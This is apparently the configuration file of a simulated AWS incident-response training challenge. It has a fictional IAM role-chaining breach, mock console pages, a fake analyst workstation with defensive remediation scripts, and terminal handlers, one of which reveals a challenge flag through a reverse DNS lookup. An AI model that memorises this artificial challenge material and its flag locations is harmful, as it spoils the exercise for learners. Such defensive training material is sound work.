        scenario: 'Nexus Cloud Corp\'s IAM governance is a patchwork of legacy roles built by three different DevOps teams over two years. The lambda-exec-role was originally scoped to Lambda execution — but a careless engineer added an inline policy granting sts:AssumeRole on * "temporarily" six months ago and it was never removed. That role could assume admin-backup-role, which had AdministratorAccess. From there, the attacker hopped to a cross-account role in a forgotten sandbox account (987654321098) that still had full RDS and S3 permissions. Three API calls. Three hops. Full account access.',
        outro: 'The breach involved: one compromised IAM user, a three-hop role chain, three cryptomining EC2 instances, one publicly exposed S3 bucket containing 2.4 GB of client PII, and one RDS snapshot shared to an external AWS account. Total estimated cost: $47,000/month in unauthorized compute, plus regulatory exposure under CCPA and GDPR for the PII exfiltration. The cascade could have been stopped at any link in the chain.',
        ecer: {
            executive: 'No IAM governance program; permission sprawl accepted as "the cost of moving fast"; security budget cut by 40% in Q3 2025',
            culture: 'Three siloed DevOps teams with no centralized IAM review; "temporary" policy changes never tracked or reverted; GuardDuty alerts routed to a Slack channel with no on-call ownership',
            employee: 'Inline sts:AssumeRole wildcard left active for 6 months; admin-backup-role with AdministratorAccess never audited; cross-account trust relationship to a sandbox account never decommissioned',
            regulatory: 'S3 Block Public Access disabled at bucket level; no CloudTrail alerting on AssumeRole chains; RDS snapshot sharing not restricted by SCP; no automated remediation for GuardDuty findings'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Simulated AWS Console
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'https://console.aws.amazon.com/',

        pages: {
            'https://console.aws.amazon.com/': {
                title: 'AWS Management Console',
                html: `
                    <div style="background:#232f3e; margin:-16px -16px 16px; padding:12px 16px; display:flex; align-items:center; gap:12px;">
                        <div style="color:#f90; font-weight:900; font-size:1rem; letter-spacing:-0.02em;">aws</div>
                        <div style="color:#ccc; font-size:0.75rem;">Services &nbsp;&#9660;</div>
                        <div style="flex:1;"></div>
                        <div style="color:#ccc; font-size:0.72rem;">analyst @ prod-nexus-cloud (123456789012)</div>
                    </div>

                    <div style="background:#ffa50014; border:1px solid #f39c12; border-radius:6px; padding:12px 16px; margin-bottom:16px;">
                        <div style="font-weight:700; color:#d68910; font-size:0.85rem;">SECURITY INCIDENT ALERT</div>
                        <div style="font-size:0.8rem; color:#555; margin-top:4px;">GuardDuty has flagged 4 high-severity findings. Suspected IAM compromise in progress. Case: CASE-2026-0847</div>
                    </div>

                    <div style="display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-bottom:16px;">
                        <div data-nav="https://console.aws.amazon.com/guardduty/" style="background:#f8f9fa; border:1px solid #e0e0e0; border-radius:6px; padding:14px; text-align:center; cursor:pointer; transition:box-shadow 0.15s;" onmouseover="this.style.boxShadow='0 2px 8px rgba(0,0,0,0.12)'" onmouseout="this.style.boxShadow=''">
                            <div style="font-size:1.4rem; margin-bottom:6px;">&#128721;</div>
                            <div style="font-weight:700; font-size:0.8rem; color:#232f3e;">GuardDuty</div>
                            <div style="font-size:0.68rem; color:#e74c3c; margin-top:2px;">4 active findings</div>
                        </div>
                        <div data-nav="https://console.aws.amazon.com/cloudtrail/" style="background:#f8f9fa; border:1px solid #e0e0e0; border-radius:6px; padding:14px; text-align:center; cursor:pointer; transition:box-shadow 0.15s;" onmouseover="this.style.boxShadow='0 2px 8px rgba(0,0,0,0.12)'" onmouseout="this.style.boxShadow=''">
                            <div style="font-size:1.4rem; margin-bottom:6px;">&#128260;</div>
                            <div style="font-weight:700; font-size:0.8rem; color:#232f3e;">CloudTrail</div>
                            <div style="font-size:0.68rem; color:#888; margin-top:2px;">Event History</div>
                        </div>
                        <div data-nav="https://console.aws.amazon.com/iam/" style="background:#f8f9fa; border:1px solid #e0e0e0; border-radius:6px; padding:14px; text-align:center; cursor:pointer; transition:box-shadow 0.15s;" onmouseover="this.style.boxShadow='0 2px 8px rgba(0,0,0,0.12)'" onmouseout="this.style.boxShadow=''">
                            <div style="font-size:1.4rem; margin-bottom:6px;">&#128100;</div>
                            <div style="font-weight:700; font-size:0.8rem; color:#232f3e;">IAM</div>
                            <div style="font-size:0.68rem; color:#888; margin-top:2px;">Roles &amp; Policies</div>
                        </div>
                        <div data-nav="https://console.aws.amazon.com/s3/" style="background:#f8f9fa; border:1px solid #e0e0e0; border-radius:6px; padding:14px; text-align:center; cursor:pointer; transition:box-shadow 0.15s;" onmouseover="this.style.boxShadow='0 2px 8px rgba(0,0,0,0.12)'" onmouseout="this.style.boxShadow=''">
                            <div style="font-size:1.4rem; margin-bottom:6px;">&#128193;</div>
                            <div style="font-weight:700; font-size:0.8rem; color:#232f3e;">S3</div>
                            <div style="font-size:0.68rem; color:#e74c3c; margin-top:2px;">1 bucket public</div>
                        </div>
                        <div data-nav="https://console.aws.amazon.com/ec2/" style="background:#f8f9fa; border:1px solid #e0e0e0; border-radius:6px; padding:14px; text-align:center; cursor:pointer; transition:box-shadow 0.15s;" onmouseover="this.style.boxShadow='0 2px 8px rgba(0,0,0,0.12)'" onmouseout="this.style.boxShadow=''">
                            <div style="font-size:1.4rem; margin-bottom:6px;">&#128187;</div>
                            <div style="font-weight:700; font-size:0.8rem; color:#232f3e;">EC2</div>
                            <div style="font-size:0.68rem; color:#e74c3c; margin-top:2px;">3 anomalous instances</div>
                        </div>
                        <div data-nav="https://console.aws.amazon.com/rds/" style="background:#f8f9fa; border:1px solid #e0e0e0; border-radius:6px; padding:14px; text-align:center; cursor:pointer; transition:box-shadow 0.15s;" onmouseover="this.style.boxShadow='0 2px 8px rgba(0,0,0,0.12)'" onmouseout="this.style.boxShadow=''">
                            <div style="font-size:1.4rem; margin-bottom:6px;">&#128202;</div>
                            <div style="font-weight:700; font-size:0.8rem; color:#232f3e;">RDS</div>
                            <div style="font-size:0.68rem; color:#e74c3c; margin-top:2px;">Unauthorized snapshot</div>
                        </div>
                    </div>
                `,
                formHandler: null
            },

            'https://console.aws.amazon.com/guardduty/': {
                title: 'Amazon GuardDuty — Findings',
                html: function() {
                    C5Config._guarddutyReviewed = true;
                    var rows = C5Config._guardduty.findings.map(function(f) {
                        var sevColor = f.severity >= 7 ? '#e74c3c' : f.severity >= 4 ? '#f39c12' : '#3498db';
                        return `<tr style="border-bottom:1px solid #eee;">
                            <td style="padding:8px 10px; font-size:0.75rem; font-family:monospace; color:#888;">${f.id}</td>
                            <td style="padding:8px 10px; font-size:0.75rem;">${f.type}</td>
                            <td style="padding:8px 10px; text-align:center;"><span style="background:${sevColor}; color:#fff; padding:2px 8px; border-radius:3px; font-size:0.7rem; font-weight:700;">${f.severity.toFixed(1)}</span></td>
                            <td style="padding:8px 10px; font-size:0.75rem; color:#555;">${f.description.substring(0, 90)}...</td>
                            <td style="padding:8px 10px; font-size:0.7rem; color:#888;">${f.createdAt}</td>
                        </tr>`;
                    }).join('');
                    return `<div style="margin-bottom:12px; display:flex; align-items:center; justify-content:space-between;">
                        <div style="font-weight:700; font-size:0.95rem; color:#232f3e;">GuardDuty Findings</div>
                        <div style="background:#e74c3c; color:#fff; padding:3px 10px; border-radius:12px; font-size:0.72rem; font-weight:700;">4 HIGH</div>
                    </div>
                    <table style="width:100%; border-collapse:collapse; font-size:0.8rem;">
                        <thead>
                            <tr style="background:#f4f4f4;">
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Finding ID</th>
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Type</th>
                                <th style="padding:8px 10px; text-align:center; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Severity</th>
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Description</th>
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Created</th>
                            </tr>
                        </thead>
                        <tbody>${rows}</tbody>
                    </table>
                    <div style="margin-top:12px; padding:10px; background:#fff8e1; border-radius:4px; font-size:0.75rem; color:#856404; border:1px solid #ffc107;">
                        <strong>Analyst note:</strong> Focus on gd-f001 — the Tor exit node source IP (185.220.101.47) is the initial access vector. All subsequent events trace back to this session.
                    </div>`;
                },
                formHandler: null
            },

            'https://console.aws.amazon.com/cloudtrail/': {
                title: 'AWS CloudTrail — Event History',
                html: function() {
                    C5Config._cloudtrailReviewed = true;
                    var rows = C5Config._cloudtrail.events.map(function(e) {
                        var nameColor = (e.eventName === 'AssumeRole') ? '#e74c3c' :
                                        (e.eventName.includes('Put') || e.eventName.includes('Modify') || e.eventName.includes('Run') || e.eventName.includes('Authorize')) ? '#f39c12' : '#555';
                        var principal = (e.userIdentity.userName) ? e.userIdentity.userName :
                                        (e.userIdentity.sessionContext && e.userIdentity.sessionContext.sessionIssuer)
                                            ? e.userIdentity.sessionContext.sessionIssuer.arn.split('/').pop() : e.userIdentity.type;
                        return `<tr style="border-bottom:1px solid #eee;">
                            <td style="padding:7px 8px; font-size:0.7rem; color:#888; font-family:monospace;">${e.eventTime}</td>
                            <td style="padding:7px 8px; font-size:0.75rem; font-weight:600; color:${nameColor};">${e.eventName}</td>
                            <td style="padding:7px 8px; font-size:0.72rem; color:#555;">${e.eventSource.replace('.amazonaws.com','')}</td>
                            <td style="padding:7px 8px; font-size:0.72rem; color:#555;">${principal}</td>
                            <td style="padding:7px 8px; font-size:0.72rem; color:#888;">${e.sourceIPAddress}</td>
                        </tr>`;
                    }).join('');
                    return `<div style="margin-bottom:12px; font-weight:700; font-size:0.95rem; color:#232f3e;">CloudTrail Event History — CASE-2026-0847</div>
                    <div style="margin-bottom:10px; font-size:0.75rem; color:#888;">Time range: 2026-03-14 02:00–02:25 UTC &nbsp;|&nbsp; Filter: All events &nbsp;|&nbsp; 10 events shown</div>
                    <table style="width:100%; border-collapse:collapse;">
                        <thead>
                            <tr style="background:#f4f4f4;">
                                <th style="padding:7px 8px; text-align:left; color:#555; font-size:0.7rem; border-bottom:2px solid #ddd;">Time (UTC)</th>
                                <th style="padding:7px 8px; text-align:left; color:#555; font-size:0.7rem; border-bottom:2px solid #ddd;">Event Name</th>
                                <th style="padding:7px 8px; text-align:left; color:#555; font-size:0.7rem; border-bottom:2px solid #ddd;">Service</th>
                                <th style="padding:7px 8px; text-align:left; color:#555; font-size:0.7rem; border-bottom:2px solid #ddd;">Principal</th>
                                <th style="padding:7px 8px; text-align:left; color:#555; font-size:0.7rem; border-bottom:2px solid #ddd;">Source IP</th>
                            </tr>
                        </thead>
                        <tbody>${rows}</tbody>
                    </table>
                    <div style="margin-top:12px; padding:10px; background:#fdf2f2; border-radius:4px; font-size:0.75rem; color:#922b21; border:1px solid rgba(231,76,60,0.3);">
                        <strong>Red flag pattern:</strong> Three consecutive AssumeRole events (ct-001 through ct-003) from the same Tor IP indicate a scripted role chain pivot. Note how each hop increases privilege level.
                    </div>`;
                },
                formHandler: null
            },

            'https://console.aws.amazon.com/iam/': {
                title: 'AWS IAM — Roles',
                html: function() {
                    var roleRows = Object.entries(C5Config._iam.roles).map(function(entry) {
                        var name = entry[0];
                        var role = entry[1];
                        var policyCount = (role.attachedPolicies || []).length + Object.keys(role.inlinePolicies || {}).length;
                        var warn = (name === 'admin-backup-role') ? '<span style="color:#e74c3c; font-size:0.68rem; font-weight:700;"> [AdministratorAccess]</span>' :
                                   (name === 'lambda-exec-role') ? '<span style="color:#f39c12; font-size:0.68rem; font-weight:700;"> [sts:AssumeRole wildcard]</span>' : '';
                        return `<tr style="border-bottom:1px solid #eee;">
                            <td style="padding:8px 10px; font-size:0.8rem; font-weight:600; color:#0073bb;">${name}${warn}</td>
                            <td style="padding:8px 10px; font-size:0.72rem; font-family:monospace; color:#555;">${role.arn.replace('arn:aws:iam::','').replace(':role/','  ')}</td>
                            <td style="padding:8px 10px; font-size:0.72rem; color:#555;">${policyCount} polic${policyCount !== 1 ? 'ies' : 'y'}</td>
                        </tr>`;
                    }).join('');
                    return `<div style="margin-bottom:12px; font-weight:700; font-size:0.95rem; color:#232f3e;">IAM Roles — Account 123456789012</div>
                    <table style="width:100%; border-collapse:collapse;">
                        <thead>
                            <tr style="background:#f4f4f4;">
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Role Name</th>
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">ARN</th>
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Policies</th>
                            </tr>
                        </thead>
                        <tbody>${roleRows}</tbody>
                    </table>
                    <div style="margin-top:12px; padding:10px; background:#fff8e1; border-radius:4px; font-size:0.75rem; color:#856404; border:1px solid #ffc107;">
                        <strong>Misconfiguration chain:</strong> lambda-exec-role has inline policy granting <code>sts:AssumeRole</code> on <code>*</code> &rarr; allows assuming admin-backup-role (AdministratorAccess) &rarr; allows assuming cross-account-role (RDS + S3 Full). Three hops, full account takeover.
                    </div>`;
                },
                formHandler: null
            },

            'https://console.aws.amazon.com/s3/': {
                title: 'Amazon S3 — Buckets',
                html: function() {
                    var bucketRows = C5Config._s3.buckets.map(function(b) {
                        var aclBadge = (b.acl === 'public-read')
                            ? '<span style="background:#e74c3c; color:#fff; padding:2px 7px; border-radius:3px; font-size:0.68rem; font-weight:700;">PUBLIC</span>'
                            : '<span style="background:#2ecc71; color:#fff; padding:2px 7px; border-radius:3px; font-size:0.68rem; font-weight:700;">Private</span>';
                        return `<tr style="border-bottom:1px solid #eee;">
                            <td style="padding:8px 10px; font-size:0.78rem; font-weight:600; color:#0073bb;">${b.name}</td>
                            <td style="padding:8px 10px; font-size:0.75rem; color:#555;">${b.region}</td>
                            <td style="padding:8px 10px;">${aclBadge}</td>
                            <td style="padding:8px 10px; font-size:0.72rem; color:#888;">${b.created.split('T')[0]}</td>
                        </tr>`;
                    }).join('');
                    return `<div style="margin-bottom:12px; font-weight:700; font-size:0.95rem; color:#232f3e;">S3 Buckets — Account 123456789012</div>
                    <table style="width:100%; border-collapse:collapse;">
                        <thead>
                            <tr style="background:#f4f4f4;">
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Bucket Name</th>
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Region</th>
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Access</th>
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Created</th>
                            </tr>
                        </thead>
                        <tbody>${bucketRows}</tbody>
                    </table>
                    <div style="margin-top:12px; padding:10px; background:#fdf2f2; border-radius:4px; font-size:0.75rem; color:#922b21; border:1px solid rgba(231,76,60,0.3);">
                        <strong>Critical:</strong> nexus-prod-client-data-us-east-1 has been set to public-read. The latest export (client-pii-full-2026-03-13.csv, 2.4 GB) was accessed by 185.220.101.47 at 02:22 UTC via GetObject.
                    </div>`;
                },
                formHandler: null
            },

            'https://console.aws.amazon.com/ec2/': {
                title: 'Amazon EC2 — Instances',
                html: function() {
                    var instanceRows = C5Config._ec2.instances.map(function(inst) {
                        var stateBadge = (inst.state === 'running')
                            ? '<span style="color:#2ecc71; font-weight:700; font-size:0.75rem;">&#11044; running</span>'
                            : '<span style="color:#888; font-size:0.75rem;">&#11044; ' + inst.state + '</span>';
                        var nameTag = (inst.tags.find(function(t) { return t.key === 'Name'; }) || {}).value || '-';
                        var suspicious = nameTag.includes('sys-optimizer') || nameTag.includes('sys-opt');
                        var rowStyle = suspicious ? 'background:#fdf2f2;' : '';
                        return `<tr style="border-bottom:1px solid #eee; ${rowStyle}">
                            <td style="padding:7px 8px; font-size:0.72rem; font-family:monospace; color:#0073bb;">${inst.instanceId}</td>
                            <td style="padding:7px 8px; font-size:0.75rem; font-weight:${suspicious ? '700' : '400'}; color:${suspicious ? '#e74c3c' : '#555'};">${nameTag}</td>
                            <td style="padding:7px 8px; font-size:0.72rem; color:#555;">${inst.instanceType}</td>
                            <td style="padding:7px 8px;">${stateBadge}</td>
                            <td style="padding:7px 8px; font-size:0.72rem; color:#888;">${inst.publicIpAddress || '-'}</td>
                            <td style="padding:7px 8px; font-size:0.72rem; color:#888;">${inst.launchTime.split('T')[0]}</td>
                        </tr>`;
                    }).join('');
                    return `<div style="margin-bottom:12px; font-weight:700; font-size:0.95rem; color:#232f3e;">EC2 Instances — us-east-1</div>
                    <table style="width:100%; border-collapse:collapse;">
                        <thead>
                            <tr style="background:#f4f4f4;">
                                <th style="padding:7px 8px; text-align:left; color:#555; font-size:0.7rem; border-bottom:2px solid #ddd;">Instance ID</th>
                                <th style="padding:7px 8px; text-align:left; color:#555; font-size:0.7rem; border-bottom:2px solid #ddd;">Name</th>
                                <th style="padding:7px 8px; text-align:left; color:#555; font-size:0.7rem; border-bottom:2px solid #ddd;">Type</th>
                                <th style="padding:7px 8px; text-align:left; color:#555; font-size:0.7rem; border-bottom:2px solid #ddd;">State</th>
                                <th style="padding:7px 8px; text-align:left; color:#555; font-size:0.7rem; border-bottom:2px solid #ddd;">Public IP</th>
                                <th style="padding:7px 8px; text-align:left; color:#555; font-size:0.7rem; border-bottom:2px solid #ddd;">Launched</th>
                            </tr>
                        </thead>
                        <tbody>${instanceRows}</tbody>
                    </table>
                    <div style="margin-top:12px; padding:10px; background:#fdf2f2; border-radius:4px; font-size:0.75rem; color:#922b21; border:1px solid rgba(231,76,60,0.3);">
                        <strong>Anomaly:</strong> Three c5.4xlarge instances (sys-optimizer-01/02/03) launched at 02:08 UTC by admin-backup-role. c5.4xlarge = 16 vCPU optimized for compute — classic cryptomining profile. Check user-data for bootstrap script.
                    </div>`;
                },
                formHandler: null
            },

            'https://console.aws.amazon.com/rds/': {
                title: 'Amazon RDS — Snapshots',
                html: function() {
                    var snapRows = C5Config._rds.snapshots.map(function(s) {
                        var typeBadge = (s.snapshotType === 'manual')
                            ? '<span style="background:#e74c3c; color:#fff; padding:2px 7px; border-radius:3px; font-size:0.68rem; font-weight:700;">manual</span>'
                            : '<span style="background:#3498db; color:#fff; padding:2px 7px; border-radius:3px; font-size:0.68rem; font-weight:700;">automated</span>';
                        var shared = (s.attributeValues && s.attributeValues.length > 0)
                            ? `<span style="color:#e74c3c; font-size:0.7rem; font-weight:700;">Shared: ${s.attributeValues.join(', ')}</span>`
                            : '<span style="color:#888; font-size:0.72rem;">Not shared</span>';
                        return `<tr style="border-bottom:1px solid #eee; ${s.snapshotType === 'manual' ? 'background:#fdf2f2;' : ''}">
                            <td style="padding:8px 10px; font-size:0.72rem; font-family:monospace; color:#0073bb;">${s.dbSnapshotIdentifier}</td>
                            <td style="padding:8px 10px; font-size:0.75rem; color:#555;">${s.dbInstanceIdentifier}</td>
                            <td style="padding:8px 10px;">${typeBadge}</td>
                            <td style="padding:8px 10px; font-size:0.72rem; color:#888;">${s.snapshotCreateTime}</td>
                            <td style="padding:8px 10px;">${shared}</td>
                        </tr>`;
                    }).join('');
                    return `<div style="margin-bottom:12px; font-weight:700; font-size:0.95rem; color:#232f3e;">RDS Snapshots — us-east-1</div>
                    <table style="width:100%; border-collapse:collapse;">
                        <thead>
                            <tr style="background:#f4f4f4;">
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Snapshot ID</th>
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">DB Instance</th>
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Type</th>
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Created</th>
                                <th style="padding:8px 10px; text-align:left; color:#555; font-size:0.72rem; border-bottom:2px solid #ddd;">Shared With</th>
                            </tr>
                        </thead>
                        <tbody>${snapRows}</tbody>
                    </table>
                    <div style="margin-top:12px; padding:10px; background:#fdf2f2; border-radius:4px; font-size:0.75rem; color:#922b21; border:1px solid rgba(231,76,60,0.3);">
                        <strong>Critical:</strong> manual-snap-1710374062 was shared with external account 987654321098. Use <code>aws rds describe-db-snapshot-attributes --db-snapshot-identifier manual-snap-1710374062</code> to inspect the tags and find all associated metadata.
                    </div>`;
                },
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (analyst IR workstation)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'analyst': {
                            type: 'dir',
                            children: {
                                'ir-notes.txt': {
                                    type: 'file',
                                    content: '=== INCIDENT RESPONSE: CASE-2026-0847 ===\nDate: 2026-03-14 | Status: ACTIVE\nReporter: GuardDuty automated alert\nSeverity: CRITICAL\n\nInitial triage:\n- GuardDuty triggered at 02:03 UTC on lambda-deploy-svc\n- Source IP: 185.220.101.47 (Tor exit node)\n- Suspected IAM role chaining attack\n\nObjectives:\n1. Confirm compromised IAM user and source IP\n2. Map the full role chain\n3. Enumerate all affected resources\n4. Quantify data exposure\n5. Contain and remediate\n\nAWS CLI profile configured: analyst-readonly\nRegion: us-east-1\nAccount: 123456789012 (prod-nexus-cloud)'
                                },
                                '.aws': {
                                    type: 'dir',
                                    children: {
                                        'config': {
                                            type: 'file',
                                            content: '[default]\nregion = us-east-1\noutput = json\n\n[profile analyst-readonly]\nregion = us-east-1\nrole_arn = arn:aws:iam::123456789012:role/ir-readonly-role\nsource_profile = default'
                                        },
                                        'credentials': {
                                            type: 'file',
                                            content: '[default]\naws_access_key_id = AKIAANALYST00001\naws_secret_access_key = [REDACTED — stored in secrets manager]\n\n# IR Analyst credentials — Read-only access\n# Account: 123456789012 (prod-nexus-cloud)'
                                        }
                                    }
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'aws guardduty list-detectors\naws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole\naws iam list-roles\naws s3 ls\naws ec2 describe-instances --filters Name=launch-time,Values=2026-03-14*\ndig -x 185.220.101.47'
                                },
                                'cloudtrail-export': {
                                    type: 'dir',
                                    children: {
                                        'events-2026-03-14.json': {
                                            type: 'file',
                                            content: '[\n  { "eventId": "ct-001", "eventTime": "2026-03-14T02:03:11Z", "eventName": "AssumeRole", "sourceIPAddress": "185.220.101.47", "userIdentity": { "userName": "lambda-deploy-svc" }, "requestParameters": { "roleArn": "arn:aws:iam::123456789012:role/lambda-exec-role" } },\n  { "eventId": "ct-002", "eventTime": "2026-03-14T02:04:08Z", "eventName": "AssumeRole", "sourceIPAddress": "185.220.101.47", "userIdentity": { "sessionIssuer": "lambda-exec-role" }, "requestParameters": { "roleArn": "arn:aws:iam::123456789012:role/admin-backup-role" } },\n  { "eventId": "ct-003", "eventTime": "2026-03-14T02:05:22Z", "eventName": "AssumeRole", "sourceIPAddress": "185.220.101.47", "userIdentity": { "sessionIssuer": "admin-backup-role" }, "requestParameters": { "roleArn": "arn:aws:iam::987654321098:role/cross-account-role" } },\n  { "eventId": "ct-004", "eventTime": "2026-03-14T02:06:44Z", "eventName": "ListBuckets", "sourceIPAddress": "185.220.101.47" },\n  { "eventId": "ct-005", "eventTime": "2026-03-14T02:07:15Z", "eventName": "RunInstances", "sourceIPAddress": "185.220.101.47", "requestParameters": { "instanceType": "c5.4xlarge", "count": 3 } },\n  ...\n]'
                                        },
                                        'guardduty-findings.json': {
                                            type: 'file',
                                            content: '[\n  { "id": "gd-f001", "type": "UnauthorizedAccess:IAMUser/TorIPCaller", "severity": 8.0, "sourceIP": "185.220.101.47", "userName": "lambda-deploy-svc" },\n  { "id": "gd-f002", "type": "Recon:IAMUser/UserPermissions", "severity": 5.0 },\n  { "id": "gd-f003", "type": "CryptoCurrency:EC2/BitcoinTool.B", "severity": 8.0, "instanceId": "i-0a1b2c3d4e5f67890" },\n  { "id": "gd-f004", "type": "Policy:S3/BucketPublicAccessGranted", "severity": 6.0, "bucket": "nexus-prod-client-data-us-east-1" }\n]'
                                        }
                                    }
                                },
                                'remediation': {
                                    type: 'dir',
                                    children: {
                                        'revoke-sessions.sh': {
                                            type: 'file',
                                            content: '#!/bin/bash\n# Revoke all active sessions for compromised IAM user\naws iam update-access-key \\\n    --access-key-id AKIA_SIMULATED_EXAMPLE \\\n    --status Inactive \\\n    --user-name lambda-deploy-svc\n\n# Attach an explicit deny policy to block all actions\naws iam put-user-policy \\\n    --user-name lambda-deploy-svc \\\n    --policy-name EmergencyDeny \\\n    --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"*","Resource":"*"}]}\'\n\necho "Credentials revoked. Active sessions will expire within 1 hour."\necho "Note: Use aws iam delete-access-key to permanently remove the key."'
                                        },
                                        'fix-iam-policy.sh': {
                                            type: 'file',
                                            content: '#!/bin/bash\n# Remove the overly permissive inline policy from lambda-exec-role\naws iam delete-role-policy \\\n    --role-name lambda-exec-role \\\n    --policy-name LambdaExecOverride\n\n# Restrict trust policy on admin-backup-role to known principals only\ncat > /tmp/restricted-trust.json << EOF\n{\n  "Version": "2012-10-17",\n  "Statement": [\n    {\n      "Effect": "Allow",\n      "Principal": { "Service": "lambda.amazonaws.com" },\n      "Action": "sts:AssumeRole"\n    }\n  ]\n}\nEOF\n\naws iam update-assume-role-policy \\\n    --role-name admin-backup-role \\\n    --policy-document file:///tmp/restricted-trust.json\n\necho "IAM misconfiguration remediated."'
                                        },
                                        'restore-s3-acl.sh': {
                                            type: 'file',
                                            content: '#!/bin/bash\n# Restore S3 bucket to private ACL\naws s3api put-bucket-acl \\\n    --bucket nexus-prod-client-data-us-east-1 \\\n    --acl private\n\n# Enable Block Public Access\naws s3api put-public-access-block \\\n    --bucket nexus-prod-client-data-us-east-1 \\\n    --public-access-block-configuration \\\n    BlockPublicAcls=true,BlockPublicPolicy=true,IgnorePublicAcls=true,RestrictPublicBuckets=true\n\necho "S3 bucket nexus-prod-client-data-us-east-1 restored to private."\necho "Verify: aws s3api get-bucket-acl --bucket nexus-prod-client-data-us-east-1"'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'ir-workstation' },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nanalyst:x:1000:1000:IR Analyst:/home/analyst:/bin/bash'
                        }
                    }
                },
                'tmp': { type: 'dir', children: {} },
                'usr': {
                    type: 'dir',
                    children: {
                        'local': {
                            type: 'dir',
                            children: {
                                'bin': {
                                    type: 'dir',
                                    children: {
                                        'aws': { type: 'file', content: '#!/usr/bin/env python3\n# AWS CLI v2.15.0\n# Configured for account 123456789012' }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (AWS CLI simulation + IR tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        // -------------------------------------------------------
        // AWS CLI dispatcher — routes subcommands to handlers
        // -------------------------------------------------------
        'aws': function(args, term, engine) {
            if (!args || args.length === 0) {
                return 'usage: aws [options] <command> <subcommand> [parameters]\n\nAvailable commands:\n  cloudtrail    guardduty    ec2    iam    rds    s3    s3api    sts\n\nType aws <command> help for more information.';
            }

            var service = args[0];
            var subArgs = args.slice(1);

            switch (service) {
                case 'cloudtrail':  return C5Config._awsCloudtrail(subArgs, engine);
                case 'guardduty':   return C5Config._awsGuardduty(subArgs, engine);
                case 'ec2':         return C5Config._awsEc2(subArgs, engine);
                case 'iam':         return C5Config._awsIam(subArgs, engine);
                case 'rds':         return C5Config._awsRds(subArgs, engine);
                case 's3':          return C5Config._awsS3(subArgs, engine);
                case 's3api':       return C5Config._awsS3api(subArgs, engine);
                case 'sts':         return C5Config._awsSts(subArgs, engine);
                default:
                    return `Unknown command: "${service}". Use: cloudtrail, guardduty, ec2, iam, rds, s3, s3api, sts`;
            }
        },

        // -------------------------------------------------------
        // DNS / network tools
        // -------------------------------------------------------
        'dig': function(args) {
            var fullCmd = args.join(' ');
            // Reverse DNS lookup on the attacker IP — yields the user flag
            if (fullCmd.includes('-x') && fullCmd.includes('185.220.101.47')) {
                return `; <<>> DiG 9.18.19 <<>> -x 185.220.101.47
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 14422

;; ANSWER SECTION:
47.101.220.185.in-addr.arpa. 300 IN PTR  tor-exit-node-47.darknet-relay.net.

;; ADDITIONAL SECTION:
; Host metadata record (TXT):
47.101.220.185.in-addr.arpa. 300 IN TXT "{{FLAG:user}}"

;; Query time: 38 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)`;
            }
            if (fullCmd.includes('185.220.101.47')) {
                return `47.101.220.185.in-addr.arpa  300  IN  PTR  tor-exit-node-47.darknet-relay.net.`;
            }
            return `; <<>> DiG 9.18.19 <<>> ${args.join(' ')}
;; connection timed out; no servers could be reached`;
        },

        'nslookup': function(args) {
            var target = args[0] || '';
            if (target === '185.220.101.47') {
                return `Server:  8.8.8.8\nAddress: 8.8.8.8#53\n\n47.101.220.185.in-addr.arpa  name = tor-exit-node-47.darknet-relay.net.`;
            }
            return `Server:  8.8.8.8\nAddress: 8.8.8.8#53\n\n** server can't find ${target}: NXDOMAIN`;
        },

        'host': function(args) {
            var target = args[0] || '';
            if (target === '185.220.101.47') {
                return `47.101.220.185.in-addr.arpa domain name pointer tor-exit-node-47.darknet-relay.net.`;
            }
            return `Host ${target} not found: 3(NXDOMAIN)`;
        },

        'ping': function(args) {
            var target = args[0] || '';
            if (!target) return 'Usage: ping [-c count] destination';
